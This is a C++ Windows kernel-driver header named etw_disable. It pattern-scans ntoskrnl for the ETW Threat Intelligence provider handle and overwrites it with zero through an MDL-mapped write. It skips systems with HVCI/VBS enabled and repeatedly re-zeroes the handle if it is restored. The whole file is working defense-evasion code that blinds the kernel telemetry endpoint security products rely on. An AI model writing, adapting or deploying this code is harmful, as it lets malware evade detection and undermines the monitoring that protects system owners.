#pragma once
#include <imports/Defs.h>
#include <core/HyperVAllowList.h>
#include <core/NtVersion.h>


namespace etw_disable {

    inline volatile PVOID g_provider_handle = nullptr;
    inline volatile LONG  g_initialized = 0;

    __forceinline ULONG elapsed_us(const LARGE_INTEGER& start, const LARGE_INTEGER& freq) {
        LARGE_INTEGER now = KeQueryPerformanceCounter(nullptr);
        if (freq.QuadPart <= 0 || now.QuadPart < start.QuadPart)
            return 0;
        return static_cast<ULONG>(((now.QuadPart - start.QuadPart) * 1000000ULL) / static_cast<ULONGLONG>(freq.QuadPart));
    }


    __forceinline PVOID find_pattern_safe(PVOID start, ULONG size,
                                          const UCHAR* pattern, const char* mask, const char* tag) {
        LARGE_INTEGER freq = {};
        LARGE_INTEGER begin = KeQueryPerformanceCounter(&freq);
        SN_LOG("etw_disable::find_pattern_safe begin tag=%s start=%p size=0x%lx irql=%lu",
            tag ? tag : "unknown",
            start,
            size,
            static_cast<ULONG>(KeGetCurrentIrql()));

        if (!start || !pattern || !mask || size == 0) {
            SN_LOG("etw_disable::find_pattern_safe invalid tag=%s elapsed_us=%lu",
                tag ? tag : "unknown",
                elapsed_us(begin, freq));
            return nullptr;
        }

        ULONG mask_len = 0;
        while (mask[mask_len]) mask_len++;
        if (mask_len == 0 || mask_len > size) {
            SN_LOG("etw_disable::find_pattern_safe bad_mask tag=%s mask_len=%lu size=0x%lx elapsed_us=%lu",
                tag ? tag : "unknown",
                mask_len,
                size,
                elapsed_us(begin, freq));
            return nullptr;
        }

        const UCHAR* base = static_cast<const UCHAR*>(start);
        constexpr ULONG page_size = 0x1000;
        ULONG pages_seen = 0;
        ULONG invalid_pages = 0;
        ULONG candidate_bytes = 0;

        __try {
            for (ULONG i = 0; i <= size - mask_len; ) {
                ULONG_PTR current_addr = reinterpret_cast<ULONG_PTR>(base + i);
                ULONG_PTR current_page = current_addr & ~(static_cast<ULONG_PTR>(page_size) - 1);
                pages_seen++;

                if (!_MmIsAddressValid(reinterpret_cast<PVOID>(current_page))) {
                    invalid_pages++;
                    ULONG_PTR next_page = current_page + page_size;
                    ULONG skip = static_cast<ULONG>(next_page - current_addr);
                    i += skip;
                    continue;
                }

                ULONG_PTR page_end = current_page + page_size;
                ULONG max_this_page = static_cast<ULONG>(page_end - reinterpret_cast<ULONG_PTR>(base));
                if (max_this_page > size) max_this_page = size;

                if (max_this_page >= mask_len) {
                    ULONG scan_limit = max_this_page - mask_len;
                    ULONG max_start = size - mask_len;
                    if (scan_limit > max_start) scan_limit = max_start;

                    for (; i <= scan_limit; ++i) {
                        candidate_bytes++;
                        bool found = true;
                        for (ULONG j = 0; j < mask_len && found; j++) {
                            if (mask[j] == 'x' && base[i + j] != pattern[j])
                                found = false;
                        }
                        if (found) {
                            SN_LOG("etw_disable::find_pattern_safe hit tag=%s addr=%p offset=0x%lx pages=%lu invalid_pages=%lu candidate_bytes=%lu elapsed_us=%lu",
                                tag ? tag : "unknown",
                                const_cast<UCHAR*>(base + i),
                                i,
                                pages_seen,
                                invalid_pages,
                                candidate_bytes,
                                elapsed_us(begin, freq));
                            return (PVOID)(base + i);
                        }
                    }
                }

                ULONG next_i = static_cast<ULONG>(page_end - reinterpret_cast<ULONG_PTR>(base));
                if (next_i <= i)
                    ++i;
                else
                    i = next_i;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            SN_LOG("etw_disable::find_pattern_safe exception tag=%s code=0x%08lx pages=%lu invalid_pages=%lu candidate_bytes=%lu elapsed_us=%lu",
                tag ? tag : "unknown",
                static_cast<ULONG>(GetExceptionCode()),
                pages_seen,
                invalid_pages,
                candidate_bytes,
                elapsed_us(begin, freq));
            return nullptr;
        }

        SN_LOG("etw_disable::find_pattern_safe miss tag=%s pages=%lu invalid_pages=%lu candidate_bytes=%lu elapsed_us=%lu",
            tag ? tag : "unknown",
            pages_seen,
            invalid_pages,
            candidate_bytes,
            elapsed_us(begin, freq));
        return nullptr;
    }

    __forceinline PVOID resolve_relative(PVOID instruction, ULONG offset_to_disp, ULONG total_size) {
        if (!instruction)
            return nullptr;

        SN_LOG("etw_disable::resolve_relative begin instruction=%p offset=%lu total=%lu",
            instruction,
            offset_to_disp,
            total_size);
        UCHAR* ip = static_cast<UCHAR*>(instruction);
        __try {
            INT32 disp = *reinterpret_cast<INT32*>(ip + offset_to_disp);
            PVOID resolved = reinterpret_cast<PVOID>(ip + total_size + disp);
            SN_LOG("etw_disable::resolve_relative done instruction=%p disp=0x%08lx resolved=%p valid=%u",
                instruction,
                static_cast<ULONG>(disp),
                resolved,
                resolved && _MmIsAddressValid(resolved) ? 1u : 0u);
            return resolved;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            SN_LOG("etw_disable::resolve_relative exception instruction=%p code=0x%08lx",
                instruction,
                static_cast<ULONG>(GetExceptionCode()));
            return nullptr;
        }
    }

    __forceinline bool nt_section_contains(PVOID nt_base, PVOID address, SIZE_T bytes, ULONG required_characteristics) {
        if (!nt_base || !address || bytes == 0 || !_MmIsAddressValid(nt_base) || !_MmIsAddressValid(address))
            return false;

        __try {
            PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(nt_base);
            if (dos->e_magic != IMAGE_DOS_SIGNATURE)
                return false;

            PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
                static_cast<UCHAR*>(nt_base) + dos->e_lfanew);
            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
                return false;

            ULONG_PTR target = reinterpret_cast<ULONG_PTR>(address);
            if (target + bytes < target)
                return false;

            PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
            for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
                if ((sections[i].Characteristics & required_characteristics) != required_characteristics)
                    continue;

                SIZE_T section_size = sections[i].Misc.VirtualSize;
                if (section_size == 0)
                    section_size = sections[i].SizeOfRawData;
                if (section_size == 0)
                    continue;

                ULONG_PTR start = reinterpret_cast<ULONG_PTR>(nt_base) + sections[i].VirtualAddress;
                ULONG_PTR end = start + section_size;
                if (end < start)
                    continue;

                if (target >= start && target + bytes <= end)
                    return true;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return false;
    }

    __forceinline bool provider_handle_target_is_sane(PVOID nt_base, PVOID handle, UINT64* current_value) {
        if (current_value)
            *current_value = 0;
        if (!handle || (reinterpret_cast<ULONG_PTR>(handle) & (sizeof(UINT64) - 1)) != 0)
            return false;
        if (!nt_section_contains(nt_base, handle, sizeof(UINT64), IMAGE_SCN_MEM_WRITE))
            return false;

        __try {
            UINT64 value = *static_cast<volatile UINT64*>(handle);
            if (current_value)
                *current_value = value;
            if (value != 0 && value < 0xFFFF800000000000ULL)
                return false;
            return true;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }


    __forceinline bool safe_write_memory(PVOID dest, const PVOID src, SIZE_T size) {
        LARGE_INTEGER freq = {};
        LARGE_INTEGER begin = KeQueryPerformanceCounter(&freq);
        SN_LOG("etw_disable::safe_write_memory begin dest=%p src=%p size=%llu irql=%lu dest_valid=%u",
            dest,
            src,
            static_cast<unsigned long long>(size),
            static_cast<ULONG>(KeGetCurrentIrql()),
            dest && _MmIsAddressValid(dest) ? 1u : 0u);

        if (!dest || !src || size == 0) {
            SN_LOG("etw_disable::safe_write_memory invalid elapsed_us=%lu",
                elapsed_us(begin, freq));
            return false;
        }

        __try {
            PMDL mdl = _IoAllocateMdl(dest, (ULONG)size, FALSE, FALSE, nullptr);
            SN_LOG("etw_disable::safe_write_memory mdl_alloc mdl=%p elapsed_us=%lu",
                mdl,
                elapsed_us(begin, freq));
            if (!mdl)
                return false;

            SN_LOG("etw_disable::safe_write_memory probe_lock_pre mdl=%p", mdl);
            _MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
            SN_LOG("etw_disable::safe_write_memory probe_lock_post mdl=%p elapsed_us=%lu",
                mdl,
                elapsed_us(begin, freq));
            PVOID mapped = _MmMapLockedPagesSpecifyCache(
                mdl, KernelMode, MmCached, nullptr, FALSE, NormalPagePriority);
            SN_LOG("etw_disable::safe_write_memory map_result mapped=%p elapsed_us=%lu",
                mapped,
                elapsed_us(begin, freq));

            if (mapped) {
                RtlCopyMemory(mapped, src, size);
                SN_LOG("etw_disable::safe_write_memory copy_done mapped=%p size=%llu elapsed_us=%lu",
                    mapped,
                    static_cast<unsigned long long>(size),
                    elapsed_us(begin, freq));
                _MmUnmapLockedPages(mapped, mdl);
                SN_LOG("etw_disable::safe_write_memory unmap_done mapped=%p elapsed_us=%lu",
                    mapped,
                    elapsed_us(begin, freq));
            }

            _MmUnlockPages(mdl);
            SN_LOG("etw_disable::safe_write_memory unlock_done mdl=%p elapsed_us=%lu",
                mdl,
                elapsed_us(begin, freq));
            _IoFreeMdl(mdl);
            SN_LOG("etw_disable::safe_write_memory end mapped=%p ok=%u elapsed_us=%lu",
                mapped,
                mapped != nullptr ? 1u : 0u,
                elapsed_us(begin, freq));
            return mapped != nullptr;
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            SN_LOG("etw_disable::safe_write_memory exception code=0x%08lx dest=%p size=%llu elapsed_us=%lu",
                static_cast<ULONG>(GetExceptionCode()),
                dest,
                static_cast<unsigned long long>(size),
                elapsed_us(begin, freq));
            return false;
        }
    }

    __forceinline bool find_and_disable(PVOID nt_base) {
        LARGE_INTEGER freq = {};
        LARGE_INTEGER begin = KeQueryPerformanceCounter(&freq);
        SN_LOG("etw_disable::find_and_disable begin nt_base=%p irql=%lu nt_valid=%u",
            nt_base,
            static_cast<ULONG>(KeGetCurrentIrql()),
            nt_base && _MmIsAddressValid(nt_base) ? 1u : 0u);

        if (!nt_base || !_MmIsAddressValid(nt_base)) {
            SN_LOG("etw_disable::find_and_disable invalid_base elapsed_us=%lu",
                elapsed_us(begin, freq));
            return false;
        }

        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(nt_base);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
            SN_LOG("etw_disable::find_and_disable bad_dos magic=0x%04x elapsed_us=%lu",
                dos->e_magic,
                elapsed_us(begin, freq));
            return false;
        }

        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
            static_cast<UCHAR*>(nt_base) + dos->e_lfanew);
        if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE) {
            SN_LOG("etw_disable::find_and_disable bad_nt nt=%p valid=%u signature=0x%08lx elapsed_us=%lu",
                nt,
                _MmIsAddressValid(nt) ? 1u : 0u,
                _MmIsAddressValid(nt) ? nt->Signature : 0ul,
                elapsed_us(begin, freq));
            return false;
        }

        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
        SN_LOG("etw_disable::find_and_disable pe_ok sections=%u e_lfanew=0x%lx size_image=0x%lx",
            nt->FileHeader.NumberOfSections,
            static_cast<ULONG>(dos->e_lfanew),
            nt->OptionalHeader.SizeOfImage);

        if (nt_version::is_windows_11_or_newer()) {
            static const UCHAR pat_win11[] = {
                0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00,
                0x48, 0x0F, 0x44, 0xF0, 0x48, 0x8B, 0xD6, 0xE8
            };

            SN_LOG("etw_disable::find_and_disable windows11_path build=%lu",
                nt_version::build_number());

            PVOID selected_handle = nullptr;
            PVOID selected_found = nullptr;
            UINT64 selected_value = 0;
            USHORT selected_section = 0;
            ULONG raw_candidates = 0;
            ULONG valid_candidates = 0;

            for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
                if (!(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
                    continue;

                PVOID section_base = static_cast<UCHAR*>(nt_base) + sections[i].VirtualAddress;
                ULONG section_size = sections[i].Misc.VirtualSize;
                ULONG search_offset = 0;

                for (;;) {
                    if (search_offset >= section_size)
                        break;

                    PVOID search_base = static_cast<UCHAR*>(section_base) + search_offset;
                    ULONG remaining = section_size - search_offset;
                    PVOID found = find_pattern_safe(search_base, remaining, pat_win11, "xxx????xxxxxxxx", "win11_threatint_handle");
                    if (!found)
                        break;

                    raw_candidates++;
                    PVOID handle = resolve_relative(found, 3, 7);
                    UINT64 current_value = 0;
                    bool valid = provider_handle_target_is_sane(nt_base, handle, &current_value);
                    SN_LOG("etw_disable::find_and_disable windows11_candidate section=%u found=%p handle=%p valid=%u current=0x%llx raw=%lu valid_count=%lu elapsed_us=%lu",
                        i,
                        found,
                        handle,
                        valid ? 1u : 0u,
                        static_cast<unsigned long long>(current_value),
                        raw_candidates,
                        valid_candidates + (valid ? 1u : 0u),
                        elapsed_us(begin, freq));
                    if (valid) {
                        valid_candidates++;
                        if (valid_candidates == 1) {
                            selected_handle = handle;
                            selected_found = found;
                            selected_value = current_value;
                            selected_section = i;
                        }
                    }

                    ULONG consumed = static_cast<ULONG>(
                        static_cast<UCHAR*>(found) - static_cast<UCHAR*>(section_base)) + 1;
                    if (consumed <= search_offset || consumed >= section_size)
                        break;
                    search_offset = consumed;
                }
            }

            if (valid_candidates != 1 || !selected_handle) {
                SN_LOG("etw_disable::find_and_disable windows11_fail_closed raw_candidates=%lu valid_candidates=%lu selected=%p elapsed_us=%lu",
                    raw_candidates,
                    valid_candidates,
                    selected_handle,
                    elapsed_us(begin, freq));
                return false;
            }

            g_provider_handle = selected_handle;
            if (selected_value == 0) {
                SN_LOG("etw_disable::find_and_disable windows11_already_disabled section=%u found=%p handle=%p elapsed_us=%lu",
                    selected_section,
                    selected_found,
                    selected_handle,
                    elapsed_us(begin, freq));
                return true;
            }

            UINT64 zero = 0;
            bool write_ok = safe_write_memory(selected_handle, &zero, sizeof(zero));
            SN_LOG("etw_disable::find_and_disable windows11_write section=%u found=%p handle=%p old=0x%llx ok=%u elapsed_us=%lu",
                selected_section,
                selected_found,
                selected_handle,
                static_cast<unsigned long long>(selected_value),
                write_ok ? 1u : 0u,
                elapsed_us(begin, freq));
            return write_ok;
        }

        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            char name[9] = {};
            RtlCopyMemory(name, sections[i].Name, 8);
            SN_LOG("etw_disable::find_and_disable section index=%u name=%s va=0x%lx size=0x%lx chars=0x%08lx exec=%u",
                i,
                name,
                sections[i].VirtualAddress,
                sections[i].Misc.VirtualSize,
                sections[i].Characteristics,
                (sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? 1u : 0u);

            if (!(sections[i].Characteristics & IMAGE_SCN_MEM_EXECUTE))
                continue;

            PVOID section_base = static_cast<UCHAR*>(nt_base) + sections[i].VirtualAddress;
            ULONG section_size = sections[i].Misc.VirtualSize;


            static const UCHAR pat1[] = {
                0x48, 0x83, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74
            };

            PVOID found = find_pattern_safe(section_base, section_size, pat1, "xxx?????x", "pat1");
            if (found) {
                PVOID handle = resolve_relative(found, 3, 8);
                if (handle && _MmIsAddressValid(handle)) {
                    g_provider_handle = handle;
                    UINT64 zero = 0;
                    SN_LOG("etw_disable::find_and_disable write_pre pattern=pat1 section=%u handle=%p elapsed_us=%lu",
                        i,
                        handle,
                        elapsed_us(begin, freq));
                    bool write_ok = safe_write_memory(handle, &zero, sizeof(zero));
                    SN_LOG("etw_disable::find_and_disable write_post pattern=pat1 section=%u handle=%p ok=%u elapsed_us=%lu",
                        i,
                        handle,
                        write_ok ? 1u : 0u,
                        elapsed_us(begin, freq));
                    return write_ok;
                }
                SN_LOG("etw_disable::find_and_disable handle_invalid pattern=pat1 section=%u handle=%p elapsed_us=%lu",
                    i,
                    handle,
                    elapsed_us(begin, freq));
            }


            static const UCHAR pat2[] = {
                0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
                0x48, 0x89, 0x44, 0x24
            };

            found = find_pattern_safe(section_base, section_size, pat2, "xxx????xxxx", "pat2");
            if (found) {
                PVOID handle = resolve_relative(found, 3, 7);
                if (handle && _MmIsAddressValid(handle)) {
                    g_provider_handle = handle;
                    UINT64 zero = 0;
                    SN_LOG("etw_disable::find_and_disable write_pre pattern=pat2 section=%u handle=%p elapsed_us=%lu",
                        i,
                        handle,
                        elapsed_us(begin, freq));
                    bool write_ok = safe_write_memory(handle, &zero, sizeof(zero));
                    SN_LOG("etw_disable::find_and_disable write_post pattern=pat2 section=%u handle=%p ok=%u elapsed_us=%lu",
                        i,
                        handle,
                        write_ok ? 1u : 0u,
                        elapsed_us(begin, freq));
                    return write_ok;
                }
                SN_LOG("etw_disable::find_and_disable handle_invalid pattern=pat2 section=%u handle=%p elapsed_us=%lu",
                    i,
                    handle,
                    elapsed_us(begin, freq));
            }
        }

        SN_LOG("etw_disable::find_and_disable no_provider_handle elapsed_us=%lu",
            elapsed_us(begin, freq));
        return false;
    }

    __forceinline bool init() {
        BOOLEAN hvci = hvci_detect::is_hvci_enabled();
        BOOLEAN vbs_or_hvci = hv_allow_list::has_vbs_or_hvci();
        BOOLEAN ms_hv_root = hv_allow_list::is_microsoft_hyperv_root();
        SN_LOG("etw_disable::init: environment hvci=%d vbs_or_hvci=%d ms_hv_root=%d irql=%lu",
            (int)hvci,
            (int)vbs_or_hvci,
            (int)ms_hv_root,
            static_cast<ULONG>(KeGetCurrentIrql()));
        if (hvci || vbs_or_hvci) {
            _InterlockedExchange(&g_initialized, 1);
            SN_LOG("etw_disable::init: SKIP kernel_provider_write reason=vbs_or_hvci hvci=%d vbs_or_hvci=%d ms_hv_root=%d",
                (int)hvci,
                (int)vbs_or_hvci,
                (int)ms_hv_root);
            return false;
        }

        PVOID nt_base = reinterpret_cast<PVOID>(get_nt_base());
        SN_LOG("etw_disable::init: nt_base=%p", nt_base);
        if (!nt_base) {
            SN_LOG("etw_disable::init: FAIL - no nt_base");
            return false;
        }

        bool disabled = find_and_disable(nt_base);
        SN_LOG("etw_disable::init: provider_handle=%p", (PVOID)g_provider_handle);

        _InterlockedExchange(&g_initialized, 1);
        SN_LOG("etw_disable::init: done disabled=%d", (int)disabled);
        return disabled;
    }


    __forceinline bool monitor_reenablement() {
        if (!_InterlockedCompareExchange(&g_initialized, 1, 1))
            return true;

        if (!g_provider_handle || !_MmIsAddressValid((PVOID)g_provider_handle))
            return true;

        __try {
            UINT64 current_value = *static_cast<volatile UINT64*>((PVOID)g_provider_handle);

            if (current_value != 0) {
                InterlockedExchange64(
                    static_cast<volatile LONG64*>((PVOID)g_provider_handle), 0);
                return true;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return true;
        }

        return true;
    }
}
